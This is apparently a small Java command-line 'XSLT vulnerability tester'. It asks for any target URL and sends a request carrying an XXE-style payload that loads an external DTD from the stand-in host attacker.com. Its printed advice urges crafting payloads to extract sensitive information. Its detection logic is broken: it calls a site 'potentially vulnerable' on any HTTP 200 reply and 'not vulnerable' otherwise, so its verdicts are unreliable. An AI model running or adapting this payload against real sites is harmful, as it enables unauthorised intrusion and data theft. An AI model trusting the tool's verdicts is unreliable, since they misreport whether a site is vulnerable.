import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Map;

public class EnhancedXSLTVulnerabilityTester {

    public static void main(String[] args) {
        // Prompt user to enter the target website URL
        System.out.print("\u001B[34mEnter your target website URL: \u001B[0m");
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        try {
            String targetURL = reader.readLine();
            // Test for XSLT vulnerability
            testForXSLTVulnerability(targetURL);
        } catch (IOException e) {
            System.out.println("An error occurred while reading the input: " + e.getMessage());
        }
    }

    private static void testForXSLTVulnerability(String targetURL) {
        try {
            // Construct the HTTP request to the target URL
            URL url = new URL(targetURL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            // Add a header with various XSLT payloads
            connection.setRequestProperty("Accept", "application/xml, text/xml, */*; q=0.01");
            connection.setRequestProperty("XSLT", "<?xml version=\"1.0\"?><!DOCTYPE xsl:stylesheet [<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">%remote;%init;%trick;]>");
            
            // Display the request being sent
            System.out.println("\u001B[36mSending request to: " + targetURL + "\u001B[0m");
            System.out.println("\u001B[36mHeaders:\u001B[0m");
            for (Map.Entry<String, List<String>> entry : connection.getRequestProperties().entrySet()) {
                System.out.println("\u001B[36m" + entry.getKey() + ": " + entry.getValue() + "\u001B[0m");
            }
            
            // Send the request and display the response
            System.out.println("\u001B[36mWaiting for response...\u001B[0m");
            connection.connect();
            // Display response headers
            System.out.println("\u001B[36mResponse Headers:\u001B[0m");
            Map<String, List<String>> headers = connection.getHeaderFields();
            for (Map.Entry<String, List<String>> entry : headers.entrySet()) {
                System.out.println("\u001B[36m" + entry.getKey() + ": " + entry.getValue() + "\u001B[0m");
            }
            // Display response body
            System.out.println("\u001B[36mResponse Body:\u001B[0m");
            try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                String line;
                while ((line = in.readLine()) != null) {
                    System.out.println(line);
                }
            }

            // Check the response code for potential vulnerability
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                System.out.println("\u001B[32mThe target website is potentially vulnerable to XSLT injection.\u001B[0m");
                System.out.println("\u001B[33mFurther testing and analysis are required to confirm the vulnerability.\u001B[0m");
                // Instructions for testing vulnerability
                System.out.println("\u001B[33mTo test the vulnerability, try injecting different XSLT payloads into the request and observe the server's response.\u001B[0m");
                System.out.println("\u001B[33mCraft various payloads including XML entities, XPath expressions, and other XSLT constructs to manipulate the server's response or extract sensitive information.\u001B[0m");
            } else {
                System.out.println("\u001B[31mThe target website is not vulnerable to XSLT injection.\u001B[0m");
            }
        } catch (IOException e) {
            System.out.println("An error occurred while testing for XSLT vulnerability: " + e.getMessage());
        }
    }
}
